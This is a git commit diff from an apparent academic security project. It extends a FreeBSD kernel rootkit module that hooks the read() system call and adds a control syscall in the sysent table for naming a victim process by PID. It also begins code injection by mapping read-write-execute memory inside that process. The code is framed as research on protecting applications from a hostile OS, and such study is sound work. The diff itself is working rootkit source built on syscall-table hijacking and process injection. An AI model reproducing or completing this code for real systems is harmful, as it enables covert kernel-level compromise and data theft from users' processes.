a107fbc73188c13e64b8f9ad0972dc929ee1e4c8
criswell <criswell@42e9315a-1956-0410-9e23-90ee2fe044bf>
2013-04-23 18:49:34 +0000

    Added code to inject malicious code into a victim process.
    git-svn-id: https://subversion.cs.illinois.edu/svn/llvm_group/sva/trunk@11344 42e9315a-1956-0410-9e23-90ee2fe044bf

--- Rootkit/rootkit.c
+++ Rootkit/rootkit.c
@@ -11,12 +11,14 @@
  * applications on the Virtual Ghost system.
  *
  * This code is based on the examples in Designing BSD Rootkits by Joseph Kong.
+ *
  *===----------------------------------------------------------------------===
  */
 
 #include <sys/fcntl.h>
 #include <sys/param.h>
 #include <sys/module.h>
+#include <sys/mman.h>
 #include <sys/kernel.h>
 #include <sys/systm.h>
 #include <sys/proc.h>
@@ -32,16 +34,113 @@
 //  4) Attempt to directly read application data
 //
 
-// Process ID of the process to attack
-static pid_t targetPID = 0;
+// Target process to attack
+struct proc * victimProc = 0;
 
+// Flags whether malicous code has been injected
+unsigned char injected = 0;
+
+//
+// Function: isVictimThread()
+//
+// Description:
+//  Determines whether the specified thread is the thread that we are
+//  attacking.
+//
+// Return value:
+//  true  - The thread belongs to the process that we are attacking.
+//  false - The thread belongs to a process that we are not attacking.
+//
+static inline unsigned char
+isVictimThread (struct thread * td) {
+  if ((victimProc) && (td->td_proc == victimProc))
+    return 1;
+  return 0;
+}
+
+static void
+insertMaliciousCode (struct thread * td) {
+  //
+  // Don't inject anything if we've already done it.
+  //
+  if (injected)
+    return;
+
+  //
+  // Allocate some memory within the victim process.
+  //
+  uintptr_t addr = 0;
+  struct mmap_args args;
+  args.addr = 0;
+  args.len = 4096;
+  args.prot = PROT_READ | PROT_WRITE | PROT_EXEC;
+  args.flags = MAP_ANON;
+  args.fd = 0;
+  args.pos = 0;
+  addr = sys_mmap (td, &args);
+  printf ("Rootkit: memory at %lx\n", addr);
+
+  //
+  // Mark that we've inserted the malicious code.
+  //
+  injected = 1;
+}
+
+//
+// Function: command_hook()
+//
+// Description:
+//  This is a system call that we provide to allow a user-space process to
+//  control the rootkit.  It provides services such as configuring the victim
+//  process to attack.
+//
+static void
+command_hook (struct thread * td, void * syscall_args) {
+  // System call arguments
+  struct config_args {
+    pid_t victimPID;
+  };
+
+  //
+  // Find the victim process that we want to attack.  A victim PID of zero
+  // mean that we don't want to attack any process.
+  //
+  struct config_args * argsp = (struct config_args *)(syscall_args);
+  victimProc = (argsp->victimPID) ?  pfind (argsp->victimPID) : 0;
+  return;
+}
+
+//
+// Function: read_hook()
+//
+// Description:
+//  This function intercepts the read() system call.  Its job is to swipe data
+//  read from the application.
+//
 static ssize_t
 read_hook (struct thread * td, void * syscall_args) {
-  return sys_read (td, syscall_args);
+  // Number of bytes read by system call
+  ssize_t bytesRead;
+
+  //
+  // Perform the read using the original system call.
+  //
+  bytesRead = sys_read (td, syscall_args);
+
+  //
+  // If this is the victim process, and we have not injected code yet,
+  // inject the code.
+  //
+  if (isVictimThread (td))
+    insertMaliciousCode (td);
+  return bytesRead;
 }
 
 static void
 initializeRootkit (void) {
+  // Add a system call to control the rootkit
+  sysent[11].sy_call = (sy_call_t *) command_hook;
+
   // Intercept the read system call
   sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
 }
